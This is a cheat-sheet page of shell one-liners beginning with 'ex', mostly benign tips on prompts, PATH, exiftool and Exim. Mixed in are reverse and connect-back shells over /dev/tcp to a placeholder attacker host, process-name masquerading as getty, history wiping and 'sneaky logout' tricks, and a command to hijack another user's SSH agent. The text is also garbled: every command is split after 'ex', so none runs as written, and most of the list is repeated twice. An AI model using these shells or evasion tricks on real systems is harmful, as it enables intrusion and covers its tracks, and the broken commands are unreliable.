# ex

##### Hide the name of a process listed in the `ps` output

   ex ec -a "$(ps -fea | awk '{print $8}'| sort -R | head -n1)" your_command -sw1 -sw2

##### convert finenames containing a numeric index from differing to fixed index-length; padding required zeroes in front of first number

   ex port l=$1; shift; rename 'my $l=$ENV{'l'}; my $z="0" x $l; s/\d+/substr("$z$&",-$l,$l)/e' "$@"

##### Reverse Backdoor Command Shell using Netcat

   ex ec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done

##### set timestamp in exif of a image

   ex iv2 -M"set Exif.Photo.DateTimeOriginal `date "+%Y:%m:%d %H:%M:%S"`" filename.jpg

##### IFS - use entire lines in your for cycles

   ex port IFS=$(echo -e "\n")

##### save  date and time for each command in history

   ex port HISTTIMEFORMAT="%h/%d-%H:%M:%S "

##### exa

   ex a -glhrSuU -s size group-directories-first -@ | less -R

##### command to change the exif date time of a image

   ex iftool -DateTimeOriginal='2009:01:01 02:03:04' file.jpg

##### Better PS aliases

   ex port PSOA='user,pid,time,state,command' ; function _ps { /bin/ps $@ ; } ; alias psa='_ps ax -o $PSOA'

##### Day Date Time>  Instead of $ or # at the terminal

   ex port PS1='\D{%a %D %T}> '

##### Find most used focal lengths in a directory of photos

   ex iv2 *JPG | grep Focal | awk '{print $5}' | sort -n | uniq -c

##### Expand shell variables in sed scripts

   ex panded_script=$(eval "echo \"$(cat ${sed_script_file})\"") && sed -e "${expanded_script}" your_input_file

##### recursively add all sub folders with executable file of current folder to PATH environment variable

   ex port PATH=$PATH$(find "$PWD" -name '.*' -prune -o -type f -a -perm /u+x -printf ':%h\n' | sort -u | tr -d '\n'); echo $PATH

##### Open the Windows Explorer from the current directory

   ex plorer /e,.

##### Show internet IP Address in prompt > PS1 var

   ex port PS1="[\u@`curl icanhazip.com` \W]$ "

##### Convert all tabs in a file to spaces, assuming the tab width is 2

   ex pand -t 2 <filename>

##### grab all commandlinefu shell functions into a single file, suitable for sourcing.

   ex port QQ=$(mktemp -d);(cd $QQ; curl -s -O http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2400:25];for i in $(perl -ne 'print "$1\n" if( /^(\w+\(\))/ )' *|sort -u);do grep -h -m1 -B1 $i *; done)|grep -v '^' > clf.sh;rm -r $QQ

##### Alternative way to get the root directory size in megabytes

   ex pr $(fdisk  -s ` grep  ' / ' /etc/mtab |cut -d " " -f1`) / 1024

##### Windows person acting like an idiot in Linux?

   ex port PS1="C:\\>"; clear

##### Exim version

   ex im -bV

##### Delete all but the last 1000 lines of file

   ex  -c '1,$-1000d' -c 'wq' file

##### Colour part of your prompt red to indicate an error

   ex port PS1='[\[\e[36;1m\]\u@\[\e[32;1m\]\h \[\e[31;1m\]\w]# \[\e[0m\]'

##### Find out local DISPLAY number

   ex port DISPLAY=$(tr '\000' '\n' < /proc/`pidof Xorg`/cmdline | egrep '^:[0-9]+')

##### Open windows executable, file, or folder from cygwin terminal

   ex plorer $( cygpath "/path/to/file_or_exe" -w )

##### Launch an Explorer window with a file selected

   ex plorer /select,[file]

##### Purge frozen messages in Exim

   ex ipick -zi | xargs exim -Mrm

##### Remote Screenshot

   ex port DISPLAY=":0.0" && import -window root screenshot.png

##### Append current directory to $PATH temporarily.

   ex port PATH=$PATH:`pwd`

##### Get your external IP address

   ex ec 3<>/dev/tcp/whatismyip.com/80; echo -e "GET /automation/n09230945.asp HTTP/1.0\r\nHost: whatismyip.com\r\n" >&3; a=( $(cat <&3) ); echo ${a[${#a[*]}-1]};

##### Export you history to nowhere

   ex port HISTFILE=/dev/null/

##### Add timestamp to history

   ex port HISTTIMEFORMAT="%F %T "

##### save  date and time for each command in history

   ex port HISTTIMEFORMAT='%F %T '

##### Reports size of all folders in the current folder.  Useful when burning CD's and DVD's

   ex port IFS=$'\n';for dir in $( ls -l | grep ^d | cut -c 52-);do du -sh $dir; done

##### Add a folder to PATH

   ex port PATH=$PATH:/home/user/my_prog

##### Kill process you don't know the PID of, when pidof and pgrep are not available.

   ex port var1=`ps -A | grep '[u]nique' | cut -d '?' -f 1`; echo${var1/ /}; kill -9 $var1

##### Sneaky logout

   ex port HISTFILE=/dev/null && kill -9 $$

##### Bash prompt with user name, host, history number, current dir and just a touch of color

   ex port PS1='\n[\u@\h \! \w]\n\[\e[32m\]$ \[\e[0m\]'

##### show current directory

   ex plorer .

##### Sets shell timeout

   ex port TMOUT=10

##### Convert file type to unix utf-8

   ex  some_file "+set ff=unix fileencoding=utf-8" "+x"

##### Expand shortened URLs

   ex pandurl() { curl -sIL $1 | grep ^Location; }

##### pretend to be busy in office to enjoy a cup of coffee

   ex port GREP_COLOR='1;32'; cat /dev/urandom | hexdump -C | grep color=auto "ca fe"

##### Change prompt to MS-DOS one (joke)

   ex port PS1="C:\$( pwd | sed 's:/:\\\\\:g' )> "

##### A bit of privacy in .bash_history

   ex port HISTCONTROL=ignoreboth

##### Add a Clock to Your CLI

   ex port PS1="${PS1%\\\$*}"' \t \$ '

##### Clean up display when the bash prompt is displayed

   ex port PS1="\[\017\033[m\033[?9l\033[?1000l\]$PS1"

##### colored prompt

   ex port PS1='\[\033[0;35m\]\h\[\033[0;33m\] \w\[\033[00m\]: '

##### Quick command line math

   ex pr 512 \* 7

##### Ensure that each machine that you log in to has its own history file

   ex port HISTFILE="$HOME/.bash_history-$(hostname -s)"

##### Clean way of re-running bash startup scripts.

   ex ec bash

##### StopWatch, simple text, hh:mm:ss using Unix Time

   ex port I=$(date +%s); watch -t -n 1 'T=$(date +%s);E=$(($T-$I));hours=$((E / 3600)) ; seconds=$((E % 3600)) ; minutes=$((seconds / 60)) ; seconds=$((seconds % 60)) ; echo $(printf "%02d:%02d:%02d" $hours $minutes $seconds)'

##### Colour part of your prompt red to indicate an error

   ex port PROMPT_COMMAND='if (($? > 0)); then echo -ne "\033[1;31m"; fi'; export PS1='[\[\]\u\[\033[0m\] \[\033[1;34m\]\w\[\033[0m\]]\$ '

##### execute your commands and avoid history records

   ex port HISTCONTROL=ignorespace

##### pretend to be busy in office to enjoy a cup of coffee

   ex port GREP_COLOR='1;32';while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep color=auto "ca fe"

##### Expand shortened URLs

   ex pandurl() { curl -s "http://api.longurl.org/v2/expand?url=${1}&format=php" | awk -F '"' '{print $4}' }

##### Show current pathname in title of terminal

   ex port PROMPT_COMMAND='echo -ne "\033]0;${PWD/#$HOME/~}\007";'

##### Mac OS X: Change Color of the ls Command

   ex port LSCOLORS=gxfxcxdxbxegedabagacad

##### Report the established connections for a particular port

   ex port PORT=11211; ss -an4 | grep -E "ESTAB.*$PORT" | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr

##### Mutt - Change mail sender.

   ex port EMAIL=caiogore@domain.com && mutt -s "chave webmail" destination@domain.com < /dev/null

##### dd with progress bar and statistics to gzipped image

   ex port BLOCKSIZE='sudo blockdev getsize64 /dev/sdc' && sudo dd if=/dev/sdc bs=1MB | pv -s $BLOCKSIZE | gzip -9 > USB_SD_BACKUP.img.gz

##### Hide the name of a process listed in the `ps` output

   ex ec -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files

##### Export a directory to all clients via NFSv4, read/write.

   ex portfs -o fsid=0,rw :/home/jason

##### Read and write to TCP or UDP sockets with common bash tools

   ex ec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-

##### Speed up builds and scripts, remove duplicate entries in $PATH.  Users scripts are oftern bad:  PATH=/apath:$PATH type of thing cause diplicate.

   ex port PATH=`echo -n $PATH | awk -v RS=":" '{ if (!x[$0]++) {printf s $0; s=":"} }'`

##### Connect-back shell using Bash built-ins

   ex ec 0</dev/tcp/hostname/port; exec 1>&0; exec 2>&0; exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0

##### hanukkah colored bash prompt

   ex port PS1="\e[0;34m[\u\e[0;34m@\h[\e[0;33m\w\e[0m\e[0m\e[0;34m]#\e[0m "

##### Pimp your less

   ex port LESS='-x4FRSXs'

##### Define shell variable HISTIGNORE so that comments (lines starting with #) appear in shell history

   ex port HISTIGNORE=' cd "`*: PROMPT_COMMAND=?*?'

##### Move all images in a directory into a directory hierarchy based on year, month and day based on exif information

   ex iftool '-Directory<DateTimeOriginal' -d %Y/%m/%d dir

##### Configuring proxy client on terminal

   ex port http_proxy=<user>:<pass>@<server>:<port> ftp_proxy=<user>:<pass>@<server>:<port>

##### Rename all images in current directory to filename based on year, month, day and time based on exif information

   ex iftool -d %Y-%m-%d_%H.%M.%S%%-c.%%e "-filename<CreateDate" .

##### Change prompt to MS-DOS one (joke)

   ex port PS1="C:\$( pwd | sed 's:/:\\\\\\:g' )\\> "

##### Use "most" as your man pager

   ex port MANPAGER='most'

##### Edit a PDF's metadata using exiftool

   ex iftool -Title="This is the Title" -Author="Happy Man" -Subject="PDF Metadata" foo.pdf -overwrite_original

##### Picture Renamer

   ex iv2 rename *.jpg

##### Incase you miss the famous 'C:\>' prompt

   ex port PS1='C:${PWD//\//\\\}>'

##### set prompt and terminal title to display hostname, user ID and pwd

   ex port PS1='\[\e]0;\h \u \w\a\]\n\[\e[0;34m\]\u@\h \[\e[33m\]\w\[\e[0;32m\]\n\$ '

##### ignore the .svn directory in filename completion

   ex port FIGNORE=.svn

##### Image to color palette generator

   ex tract-palette() { convert "$1" -resize 300x -dither None -colors "$2" txt: | tail -n +2 | tr -s ' ' | cut -d ' ' -f 3 | sort | uniq -c | sort -rn | tr -s ' ' | cut -d ' ' -f 3;}

##### Reclaim standard in from the tty for a script that is in a pipeline

   ex ec 0</dev/tty

##### Enable color pattern match highlighting in grep(1)

   ex port GREP_OPTIONS='color=auto'

##### exim statistics about mails from queue

   ex im -bp | exiqsumm -c

##### set history file length

   ex port HISTFILESIZE=99999

##### Sum file sizes

   ex pr `find . -type f -printf "%s + "0`

##### Ride another SSH agent

   ex port SSH_AUTH_SOCK=`find /tmp/ssh* -type s -user [user] -mtime -1 | head -1`

##### Change mysql prompt to be more verbose

   ex port MYSQL_PS1="mysql://\u@\h:/\d - \R:\m:\s > "

##### Add the time to BASH prompt

   ex port PS1="(\@) $PS1"

##### Export OPML from Google Reader

   ex port-opml(){ curl -sH "Authorization: GoogleLogin auth=$(curl -sd "Email=$1&Passwd=$2&service=reader" https://www.google.com/accounts/ClientLogin | grep Auth | sed 's/Auth=\(.*\)/\1/')" http://www.google.com/reader/subscriptions/export; }

##### Adjust all EXIF timestamps in .mov by +1 hour

   ex iftool -AllDates+=1 -{Track,Media}{Create,Modify}Date+=1 *.mov

##### For pictures : copy the last hierarchical keyword (tag) in the caption (title, description) if empty.

   ex iftool -overwrite_original -preserve -recurse "-iptc:Caption-Abstract<${XMP:HierarchicalSubject;s/.+\|//g}" -if "not $iptc:Caption-Abstract" DIR

##### Let you vanish in the (bash) history.

   ex port HISTSIZE=0

##### StopWatch, OnScreen version, blinking shily on all desktops

   ex port I=$(date +%s); watch -t -n 1 'T=$(date +%s);E=$(($T-$I));hours=$((E / 3600)) ; seconds=$((E % 3600)) ; minutes=$((seconds / 60)) ; seconds=$((seconds % 60)) ; echo $(printf "%02d:%02d:%02d" $hours $minutes $seconds) | osd_cat -o 20 -d 1 -p bottom'

##### StopWatch, toilet version, amazing format inside terminal

   ex port I=$(date +%s); watch -t -n 1 'T=$(date +%s);E=$(($T-$I));hours=$((E / 3600)) ; seconds=$((E % 3600)) ; minutes=$((seconds / 60)) ; seconds=$((seconds % 60)) ; echo $(printf "%02d:%02d:%02d" $hours $minutes $seconds) | toilet -f shadow'

##### Smiley prompt based on command exit status

   ex port PS1="\[\e[01;32m\]\u@\h \[\e[01;34m\]\W \`if [ \$? = 0 ]; then echo -e '\[\e[01;32m\]:)'; else echo -e '\[\e[01;31m\]:('; fi\` \[\e[01;34m\]$\[\e[00m\]"

##### Expand shortened URLs

   ex pandurl() { wget -S $1 2>&1 | grep ^Location; }

##### Expand shortened URLs

   ex pandurl() { curl -sIL $1 2>&1 | awk '/^Location/ {print $2}' | tail -n1; }

##### Remove from PATH paths containing a string

   ex port PATH= $(echo $PATH | tr ':' '\n' | awk '!/matching string/' | paste -sd:)

##### Set Java home directory based on version for Mac OSX Yosemite

   ex port JAVA_HOME=$(/usr/libexec/java_home -v 1.7)

##### Receiving alerts about commands who exit with failure

   ex port PROMPT_COMMAND='( x=$? ; let x!=0 && echo shell returned $x )'

##### Fast grepping (avoiding UTF overhead)

   ex port LANG=C; grep string longBigFile.log

##### Create new user with sudo rights with home dir, bash shell

   ex port NEWUSER=newuser; mkdir /home/$NEWUSER; useradd -d /home/$NEWUSER -s /bin/bash -G sudo $NEWUSER; passwd $NEWUSER

##### Consistent Oracle Datapump Export

   ex pdp user/password FLASHBACK_SCN=$(echo -e "select current_scn from v\$database;" | sqlplus / as sysdba 2>/dev/null| grep [0-9][0-9][0-9][0-9][0-9][0-9]*)

##### Don't save commands in bash history (only for current session)

   ex port HISTSIZE=0

##### Arch Linux sort installed packages by size

   ex pac -S -H M "%m %n"|sort -n

##### floating point operations in shell scripts

   ex p="(2+3.0)/7.0*2^2"; val=$(awk "BEGIN {print $exp}" /dev/null)

##### List process ids (including parent and child process) of a process given its name. Similar to pgrep

   ex port proc=chrome && ps aux | grep $proc | grep -v grep |awk '{print $2}'

##### Purge frozen messages in Exim

   ex ipick -zi | xargs max-args=1000 exim -Mrm

##### Remove all older kernels then the current running kernel for Ubuntu/Debian base system

   ex port KEEP_KERNEL=2; dpkg -l 'linux-image*' | awk '/^ii/ { print $2 }' | grep "[0-9]" | awk 'BEGIN{i=1}{print i++, $0}' | grep `uname -r` -B99 | sort -r | tail -n+$(($KEEP_KERNEL+2)) | awk '{print $2}'| xargs apt-get -y purge

##### Rename files in a directory in an edited list fashion

   ex ec 3<&0; ls -1N | while read a; do echo "Rename file: $a"; read -e -i "$a" -p "To: " b <&3 ; [ "$a" == "$b" ] ||  mv -vi "$a" "$b"; done

##### Let you vanish in the (bash) history.

   ex port HISTFILE=/dev/null

##### flush (not delete) frozen emails from exim's mail queue

   ex ipick -zi | while read x ; do exim -dM  "$x"; sleep 1;done

##### a simple way to calculate the sum of all digits of a number

   ex pr `echo "123671" | sed -e 's/[0-9]/ + &/g' -e 's/^ +//g'` 20

##### Make bash look like DOS

   ex port PS1='C:${PWD//\//\\\}>'

##### Opens an explorer.exe file browser window for the current working directory or specified dir (Fixed)

   ex plorer . &

##### Cool PS1 with host, time, path and user. With color!

   ex port PS1="[\[\e[1;32m\]\u\[\e[m\]\[\e[1;31m\]@\[\e[m\]\[\e[3;35m\]\H\[\e[m\] \[\e[1;30m\]| \[\e[m\]\[\e[1;34m\]\w\[\e[m\] \[\e[1;29m\]\t\[\e[m\]]\[\e[1;33m\]$\[\e[m\]"

##### Show IP Address in prompt > PS1 var

   ex port PS1="[\u@`hostname -I` \W]$ "

##### Setting global redirection of STDERR to STDOUT in a script

   ex ec 2>&1

##### Embed .torrent in a .jpg file

   ex iftool '-comment<=ubuntu-11.10-alternate-i386.iso.torrent' hello.jpg

##### Pretend your shell is MS-DOS command.com

   ex port PROMPT_COMMAND=$PROMPT_COMMAND'; export PWD_UPCASE="${PWD^^}"'; export PS1='C:${PWD_UPCASE//\\//\\\\}>'

##### Reverse Backdoor Command Shell using Netcat

   ex ec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done

##### IFS - use entire lines in your for cycles

   ex port IFS=$(echo -e "\n")

##### save  date and time for each command in history

   ex port HISTTIMEFORMAT="%h/%d-%H:%M:%S "

##### command to change the exif date time of a image

   ex iftool -DateTimeOriginal='2009:01:01 02:03:04' file.jpg

##### grab all commandlinefu shell functions into a single file, suitable for sourcing.

   ex port QQ=$(mktemp -d);(cd $QQ; curl -s -O http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2400:25];for i in $(perl -ne 'print "$1\n" if( /^(\w+\(\))/ )' *|sort -u);do grep -h -m1 -B1 $i *; done)|grep -v '^' > clf.sh;rm -r $QQ

##### Add timestamp to history

   ex port HISTTIMEFORMAT="%F %T "

##### save  date and time for each command in history

   ex port HISTTIMEFORMAT='%F %T '

##### Bash prompt with user name, host, history number, current dir and just a touch of color

   ex port PS1='\n[\u@\h \! \w]\n\[\e[32m\]$ \[\e[0m\]'

##### Sets shell timeout

   ex port TMOUT=10

##### Convert file type to unix utf-8

   ex  some_file "+set ff=unix fileencoding=utf-8" "+x"

##### Expand shortened URLs

   ex pandurl() { curl -sIL $1 | grep ^Location; }

##### pretend to be busy in office to enjoy a cup of coffee

   ex port GREP_COLOR='1;32'; cat /dev/urandom | hexdump -C | grep color=auto "ca fe"

##### Change prompt to MS-DOS one (joke)

   ex port PS1="C:\$( pwd | sed 's:/:\\\\\:g' )> "

##### A bit of privacy in .bash_history

   ex port HISTCONTROL=ignoreboth

##### Add a Clock to Your CLI

   ex port PS1="${PS1%\\\$*}"' \t \$ '

##### Clean up display when the bash prompt is displayed

   ex port PS1="\[\017\033[m\033[?9l\033[?1000l\]$PS1"

##### colored prompt

   ex port PS1='\[\033[0;35m\]\h\[\033[0;33m\] \w\[\033[00m\]: '

##### Quick command line math

   ex pr 512 \* 7

##### Ensure that each machine that you log in to has its own history file

   ex port HISTFILE="$HOME/.bash_history-$(hostname -s)"

##### Clean way of re-running bash startup scripts.

   ex ec bash

##### StopWatch, simple text, hh:mm:ss using Unix Time

   ex port I=$(date +%s); watch -t -n 1 'T=$(date +%s);E=$(($T-$I));hours=$((E / 3600)) ; seconds=$((E % 3600)) ; minutes=$((seconds / 60)) ; seconds=$((seconds % 60)) ; echo $(printf "%02d:%02d:%02d" $hours $minutes $seconds)'

##### Colour part of your prompt red to indicate an error

   ex port PROMPT_COMMAND='if (($? > 0)); then echo -ne "\033[1;31m"; fi'; export PS1='[\[\]\u\[\033[0m\] \[\033[1;34m\]\w\[\033[0m\]]\$ '

##### execute your commands and avoid history records

   ex port HISTCONTROL=ignorespace

##### pretend to be busy in office to enjoy a cup of coffee

   ex port GREP_COLOR='1;32';while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep color=auto "ca fe"

##### Expand shortened URLs

   ex pandurl() { curl -s "http://api.longurl.org/v2/expand?url=${1}&format=php" | awk -F '"' '{print $4}' }

##### Show current pathname in title of terminal

   ex port PROMPT_COMMAND='echo -ne "\033]0;${PWD/#$HOME/~}\007";'

##### Mac OS X: Change Color of the ls Command

   ex port LSCOLORS=gxfxcxdxbxegedabagacad

##### Report the established connections for a particular port

   ex port PORT=11211; ss -an4 | grep -E "ESTAB.*$PORT" | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr

##### Mutt - Change mail sender.

   ex port EMAIL=caiogore@domain.com && mutt -s "chave webmail" destination@domain.com < /dev/null

##### dd with progress bar and statistics to gzipped image

   ex port BLOCKSIZE='sudo blockdev getsize64 /dev/sdc' && sudo dd if=/dev/sdc bs=1MB | pv -s $BLOCKSIZE | gzip -9 > USB_SD_BACKUP.img.gz

##### Hide the name of a process listed in the `ps` output

   ex ec -a "/sbin/getty 38400 tty7" your_cmd -erase_all_files

##### Export a directory to all clients via NFSv4, read/write.

   ex portfs -o fsid=0,rw :/home/jason

##### Read and write to TCP or UDP sockets with common bash tools

   ex ec 5<>/dev/tcp/time.nist.gov/13; cat <&5 & cat >&5; exec 5>&-

##### Speed up builds and scripts, remove duplicate entries in $PATH.  Users scripts are oftern bad:  PATH=/apath:$PATH type of thing cause diplicate.

   ex port PATH=`echo -n $PATH | awk -v RS=":" '{ if (!x[$0]++) {printf s $0; s=":"} }'`

##### Connect-back shell using Bash built-ins

   ex ec 0</dev/tcp/hostname/port; exec 1>&0; exec 2>&0; exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0

##### hanukkah colored bash prompt

   ex port PS1="\e[0;34m[\u\e[0;34m@\h[\e[0;33m\w\e[0m\e[0m\e[0;34m]#\e[0m "

##### Pimp your less

   ex port LESS='-x4FRSXs'

##### Define shell variable HISTIGNORE so that comments (lines starting with #) appear in shell history

   ex port HISTIGNORE=' cd "`*: PROMPT_COMMAND=?*?'

##### Move all images in a directory into a directory hierarchy based on year, month and day based on exif information

   ex iftool '-Directory<DateTimeOriginal' -d %Y/%m/%d dir

##### Configuring proxy client on terminal

   ex port http_proxy=<user>:<pass>@<server>:<port> ftp_proxy=<user>:<pass>@<server>:<port>

##### Rename all images in current directory to filename based on year, month, day and time based on exif information

   ex iftool -d %Y-%m-%d_%H.%M.%S%%-c.%%e "-filename<CreateDate" .

##### Change prompt to MS-DOS one (joke)

   ex port PS1="C:\$( pwd | sed 's:/:\\\\\\:g' )\\> "

##### Use "most" as your man pager

   ex port MANPAGER='most'

##### Edit a PDF's metadata using exiftool

   ex iftool -Title="This is the Title" -Author="Happy Man" -Subject="PDF Metadata" foo.pdf -overwrite_original

##### Picture Renamer

   ex iv2 rename *.jpg

##### Incase you miss the famous 'C:\>' prompt

   ex port PS1='C:${PWD//\//\\\}>'

##### set prompt and terminal title to display hostname, user ID and pwd

   ex port PS1='\[\e]0;\h \u \w\a\]\n\[\e[0;34m\]\u@\h \[\e[33m\]\w\[\e[0;32m\]\n\$ '

##### ignore the .svn directory in filename completion

   ex port FIGNORE=.svn

##### Image to color palette generator

   ex tract-palette() { convert "$1" -resize 300x -dither None -colors "$2" txt: | tail -n +2 | tr -s ' ' | cut -d ' ' -f 3 | sort | uniq -c | sort -rn | tr -s ' ' | cut -d ' ' -f 3;}

##### Reclaim standard in from the tty for a script that is in a pipeline

   ex ec 0</dev/tty

##### Enable color pattern match highlighting in grep(1)

   ex port GREP_OPTIONS='color=auto'

##### exim statistics about mails from queue

   ex im -bp | exiqsumm -c

##### set history file length

   ex port HISTFILESIZE=99999

##### Sum file sizes

   ex pr `find . -type f -printf "%s + "0`

##### Ride another SSH agent

   ex port SSH_AUTH_SOCK=`find /tmp/ssh* -type s -user [user] -mtime -1 | head -1`

##### Change mysql prompt to be more verbose

   ex port MYSQL_PS1="mysql://\u@\h:/\d - \R:\m:\s > "

##### Add the time to BASH prompt

   ex port PS1="(\@) $PS1"

##### Export OPML from Google Reader

   ex port-opml(){ curl -sH "Authorization: GoogleLogin auth=$(curl -sd "Email=$1&Passwd=$2&service=reader" https://www.google.com/accounts/ClientLogin | grep Auth | sed 's/Auth=\(.*\)/\1/')" http://www.google.com/reader/subscriptions/export; }

##### Adjust all EXIF timestamps in .mov by +1 hour

   ex iftool -AllDates+=1 -{Track,Media}{Create,Modify}Date+=1 *.mov

##### For pictures : copy the last hierarchical keyword (tag) in the caption (title, description) if empty.

   ex iftool -overwrite_original -preserve -recurse "-iptc:Caption-Abstract<${XMP:HierarchicalSubject;s/.+\|//g}" -if "not $iptc:Caption-Abstract" DIR

##### Let you vanish in the (bash) history.

   ex port HISTSIZE=0

##### StopWatch, OnScreen version, blinking shily on all desktops

   ex port I=$(date +%s); watch -t -n 1 'T=$(date +%s);E=$(($T-$I));hours=$((E / 3600)) ; seconds=$((E % 3600)) ; minutes=$((seconds / 60)) ; seconds=$((seconds % 60)) ; echo $(printf "%02d:%02d:%02d" $hours $minutes $seconds) | osd_cat -o 20 -d 1 -p bottom'

##### StopWatch, toilet version, amazing format inside terminal

   ex port I=$(date +%s); watch -t -n 1 'T=$(date +%s);E=$(($T-$I));hours=$((E / 3600)) ; seconds=$((E % 3600)) ; minutes=$((seconds / 60)) ; seconds=$((seconds % 60)) ; echo $(printf "%02d:%02d:%02d" $hours $minutes $seconds) | toilet -f shadow'

##### Smiley prompt based on command exit status

   ex port PS1="\[\e[01;32m\]\u@\h \[\e[01;34m\]\W \`if [ \$? = 0 ]; then echo -e '\[\e[01;32m\]:)'; else echo -e '\[\e[01;31m\]:('; fi\` \[\e[01;34m\]$\[\e[00m\]"

##### Expand shortened URLs

   ex pandurl() { wget -S $1 2>&1 | grep ^Location; }

##### Expand shortened URLs

   ex pandurl() { curl -sIL $1 2>&1 | awk '/^Location/ {print $2}' | tail -n1; }

##### Remove from PATH paths containing a string

   ex port PATH= $(echo $PATH | tr ':' '\n' | awk '!/matching string/' | paste -sd:)

##### Set Java home directory based on version for Mac OSX Yosemite

   ex port JAVA_HOME=$(/usr/libexec/java_home -v 1.7)

##### Receiving alerts about commands who exit with failure

   ex port PROMPT_COMMAND='( x=$? ; let x!=0 && echo shell returned $x )'

##### Fast grepping (avoiding UTF overhead)

   ex port LANG=C; grep string longBigFile.log

##### Create new user with sudo rights with home dir, bash shell

   ex port NEWUSER=newuser; mkdir /home/$NEWUSER; useradd -d /home/$NEWUSER -s /bin/bash -G sudo $NEWUSER; passwd $NEWUSER

##### Consistent Oracle Datapump Export

   ex pdp user/password FLASHBACK_SCN=$(echo -e "select current_scn from v\$database;" | sqlplus / as sysdba 2>/dev/null| grep [0-9][0-9][0-9][0-9][0-9][0-9]*)

##### Don't save commands in bash history (only for current session)

   ex port HISTSIZE=0

##### Arch Linux sort installed packages by size

   ex pac -S -H M "%m %n"|sort -n

##### floating point operations in shell scripts

   ex p="(2+3.0)/7.0*2^2"; val=$(awk "BEGIN {print $exp}" /dev/null)

##### List process ids (including parent and child process) of a process given its name. Similar to pgrep

   ex port proc=chrome && ps aux | grep $proc | grep -v grep |awk '{print $2}'

##### Purge frozen messages in Exim

   ex ipick -zi | xargs max-args=1000 exim -Mrm

##### Remove all older kernels then the current running kernel for Ubuntu/Debian base system

   ex port KEEP_KERNEL=2; dpkg -l 'linux-image*' | awk '/^ii/ { print $2 }' | grep "[0-9]" | awk 'BEGIN{i=1}{print i++, $0}' | grep `uname -r` -B99 | sort -r | tail -n+$(($KEEP_KERNEL+2)) | awk '{print $2}'| xargs apt-get -y purge

##### Rename files in a directory in an edited list fashion

   ex ec 3<&0; ls -1N | while read a; do echo "Rename file: $a"; read -e -i "$a" -p "To: " b <&3 ; [ "$a" == "$b" ] ||  mv -vi "$a" "$b"; done

##### Let you vanish in the (bash) history.

   ex port HISTFILE=/dev/null

##### flush (not delete) frozen emails from exim's mail queue

   ex ipick -zi | while read x ; do exim -dM  "$x"; sleep 1;done

##### a simple way to calculate the sum of all digits of a number

   ex pr `echo "123671" | sed -e 's/[0-9]/ + &/g' -e 's/^ +//g'` 20

##### Make bash look like DOS

   ex port PS1='C:${PWD//\//\\\}>'

##### Opens an explorer.exe file browser window for the current working directory or specified dir (Fixed)

   ex plorer . &

##### Show IP Address in prompt > PS1 var

   ex port PS1="[\u@`hostname -I` \W]$ "

##### Setting global redirection of STDERR to STDOUT in a script

   ex ec 2>&1
